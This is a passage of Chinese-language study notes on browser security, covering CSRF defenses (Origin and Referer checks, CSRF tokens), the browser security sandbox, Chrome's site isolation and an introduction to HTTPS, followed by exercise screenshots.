虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具 体可参考 Referrer Policy。

但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 Origin 属 性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性，如下图：

![image-20220709184310600](.\typora-user-images\image-20220709184310600.png)

Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细 路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。

因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际 情况判断是否使用 Referer 值。

3. **CSRF Token**

第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实 就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代 码：

```html
!DOCTYPE html>
<html>
  <body>
    <form action="https://time.geekbang.org/sendcoin" method="POST">
      <input type="hidden" name="csrf-token" value="nc98P987bcpncYhoadjoiydc9aj
      <input type="text" name="user" />
      <input type="text" name="number" />
      <input type="submit" />
    </form>
  </body>
</html>
```

第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服 务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请 求。

> 如果是 CSRF 攻击，那么黑客是拿不到受害者站点数据的。
>
> 但是黑客会在他的 A 站点中调用受害者 B 站点的 http 接口，这些接口可以是转账，删帖或者设置 等。
>
> 这个过程中你需要注意一点，在黑客 A 站点中调用受害者 B 站点的 http 接口时，默认情况下，浏览器依然会把受害者的 Cookie 等信息数据发送到受害者的 B 站点，【注意这里并不是黑客的 A 站点】。
>
> 如果 B 站点存在漏洞的话，那么黑客就会攻击成功，比如将受害者的金币转出去！

### 安全沙箱

隔离页面和操作系统。

浏览器架构是如何影响到操作系统安全的。

单进程浏览器自身的软件漏洞，在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序， 其中最常见的攻击方式是利用**缓冲区溢出**。这种类型的攻击和 XSS 注入的脚本是不一样的。

XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的 数据，但是 XSS 无法对操作系统进行攻击。

而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、 监听用户键盘输入信息以及读取用户硬盘上的文件内容。（危害最大）。整个操作系统的内容都暴露给黑客。

现代浏览器采用了多进程架构，将渲染进程和浏览器主进程做了分离，不仅是稳定性考虑，也有安全考虑。

从操作系统安全的视角来看看浏 览器的多进程架构，如下图：

![image-20220710002444912](.\typora-user-images\image-20220710002444912.png)

浏览器被划分为浏览器内核和渲染内核两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程等组成的，**渲染内核就是渲染进程**。

在浏览器中打开一个页面，这两个模块是怎么配合的？

**所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染 进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源 进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上， 而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。**

为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从渲染进程内部去请求网络资源？

为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然 后让浏览器内核去负责展示图片？

通过以上方式不是增加了工程的复杂度吗？

要解释现代浏览器为什么要把这个流程弄得这么复杂，我们就得从系统安全的角度来分析。

**安全沙箱**

由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操 作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染 进程的控制权限，进而又获取操作系统的控制权限。

因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的， 都是不安全的。但谁也不能保证浏览器不存在漏洞，只要出现漏洞，黑客就可以通过网络内 容对用户发起攻击。

如果你下载了一个恶意程序，但是没有执行它，那么恶意程序是不会生效的。同 理，网络内容对于浏览器也是如此，浏览器可以安全地下载各种网络资源，但是如果要执行 这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需 要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。

基于以上原因，我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞 被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。**将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。**

浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或 者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。

安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，而安全沙箱机制能限制进程对操作系统资源的访问和修改，所以无法在单进程浏览器中使用安全沙箱保护机制，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。

**安全沙箱如何影响各个模块功能**

安全沙箱的特点：

- 最小的保护单位是进程
- 能限制进程对操作系统资源的访问和修改

这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功 能，比如读写本地文件、发起网络请求、调用 GPU 接口等。（被安全沙箱保护的进程会有一系列的受限操作）

所以有些能力就不能在渲染进程中存在，那渲染进程和浏览器内核各自的职责就需要分配好，如下图：

![image-20220710093913156](.\typora-user-images\image-20220710093913156.png)

通过该图，我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉 及到和系统交互的功能都转移到浏览器内核中去实现。

1. **持久存储**

由于安全沙箱需要负责确保渲染进程无法直接访问用户的文件系统，但是在渲染进程内部有访问 Cookie 的需求、有上传文件 的需求，为了解决这些文件的访问需求，所以现代浏览器将读写文件的操作全部放在了浏览 器内核中实现，然后通过 IPC 将操作结果转发给渲染进程。

2. **网络访问**

渲染进程内部也是不能直接访问网络的，如果要访问网络，则 需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限 请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。

3. **用户交互**

通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用 程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND， Linux 提供的 X Window，我们就把 HWND 和 X Window 统称为窗口句柄。应用程序可 以在窗口句柄上进行绘制和接收键盘鼠标消息。

不过在现代浏览器中，由于每个渲染进程都有安全沙箱的保护，所以在渲染进程内部是无法 直接操作窗口句柄的，这也是为了限制渲染进程监控到用户的输入事件。

由于渲染进程不能直接访问窗口句柄，所以渲染进程需要完成以下两点大的改变。

第一点，渲染进程需要渲染出位图。为了向用户显示渲染进程渲染出来的位图，渲染进程需 要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。

第二点，操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器 内核。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦 点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域 内，则浏览器内核会将输入事件转发给渲染进程。

之所以这样设计，就是为了限制渲染进程有监控到用户输入事件的能力，所以所有的键盘鼠 标事件都是由浏览器内核来接收的，然后浏览器内核再通过 IPC 将这些事件发送给渲染进 程。

#### 站点隔离（Site Isolation）

所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关 联的页面放到同一个渲染进程中执行。

最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲 染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了 多个 iframe，而这些 iframe 又有可能来自于不同的站点，这就导致了多个不同站点中的内 容通过 iframe 同时运行在同一个渲染进程中。

目前所有操作系统都面临着两个 A 级漏洞——幽灵（Spectre）和熔毁（Meltdown），这 两个漏洞是由处理器架构导致的，很难修补，黑客通过这两个漏洞可以直接入侵到进程的内 部，如果入侵的进程没有安全沙箱的保护，那么黑客还可以发起对操作系统的攻击。

所以如果一个银行站点包含了一个恶意 iframe，然后这个恶意的 iframe 利用这两个 A 级 漏洞去入侵渲染进程，那么恶意程序就能读取银行站点渲染进程内的所有内容了，这对于用 户来说就存在很大的风险了。

因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进 程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。

实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。

你认为安全沙箱能防止 XSS 或者 CSRF 一类的攻击的吗？为什么？

安全沙箱是不能防止 XSS 或者 CSRF 一类的攻击，安全沙箱的目的是隔离渲染进程和操作系统，让渲染进行没有访问操作系统的权利 XSS 或者 CSRF 主要是利用网络资源获取用户的信息，这和操作系统没有关系。

### 网络安全协议 HTTPS

起初设 计 HTTP 协议的目的很单纯，就是为了传输超文本文件，那时候也没有太强的加密传输的 数据需求，所以 HTTP 一直保持着明文传输数据的特征。但这样的话，在传输过程中的每 一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人， 你们在通信过程中的一切内容都在中间人的掌握中，如下图：

![image-20220710110901393](.\typora-user-images\image-20220710110901393.png)

使用 HTTP 传输的内容很容易被中间人窃取、伪造和篡改，通常这种攻击方式称为**中间人攻击**。

具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营 商和目标服务器，在这中间的每个环节中，数据都有可能被窃取或篡改。比如用户电脑被黑 客安装了恶意软件，那么恶意软件就能抓取和篡改所发出的 HTTP 请求的内容。或者用户 一不小心连接上了 WiFi 钓鱼路由器，那么数据也都能被黑客抓取或篡改。

**在 HTTP 协议栈中引入安全层**

从 HTTP 协议栈层面来看，我们可以在 TCP 和 HTTP 之间插入一个安全层，所有经过安全 层的数据都会被加密或者解密，你可以参考下图：

![image-20220710111052189](.\typora-user-images\image-20220710111052189.png)

HTTPS 并非是一个新的协议，通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在 安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP，因此要搞清楚 HTTPS 是如何工作的，就要弄清楚安全层是怎么工作的。

安全层有两个主要的职责：**对发起 HTTP 请求的数据进行加密操作和对接收到 HTTP 的内容进行解密操作。**

一个从简单到复杂的 HTTPS 协议：

第一版：**使用对称加密**

所谓**对称加密是指加密和解密都使用的是相同的密钥**。

要在两台电脑上加解密同一个文件，我们至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：

![image-20220710111440083](.\typora-user-images\image-20220710111440083.png)

## 习题

![image-20220505231514679](.\typora-user-images\image-20220505231514679.png)

![image-20220505225756562](.\typora-user-images\image-20220505225756562.png)

![image-20220505225900400](.\typora-user-images\image-20220505225900400.png)

![image-20220505225953239](.\typora-user-images\image-20220505225953239.png)

![image-20220505230059303](.\typora-user-images\image-20220505230059303.png)

![image-20220505230314114](.\typora-user-images\image-20220505230314114.png)

![image-20220505230533771](.\typora-user-images\image-20220505230533771.png)

![image-20220505230559536](.\typora-user-images\image-20220505230559536.png)

![image-20220505230636489](.\typora-user-images\image-20220505230636489.png)

![image-20220505230711414](.\typora-user-images\image-20220505230711414.png)

![image-20220505230738542](.\typora-user-images\image-20220505230738542.png)

![image-20220505230852353](.\typora-user-images\image-20220505230852353.png)

答案：abcd

![image-20220505231045183](.\typora-user-images\image-20220505231045183.png)

![image-20220505231120062](.\typora-user-images\image-20220505231120062.png)

![image-20220505231222321](.\typora-user-images\image-20220505231222321.png)

因为在解析 JavaScript 的时候，div 元素还没有被创建出来，所有 getElementsByTagName 返回的数据是空的。

![image-20220505231311324](.\typora-user-images\image-20220505231311324.png)

![image-20220505231353309](.\typora-user-images\image-20220505231353309.png)
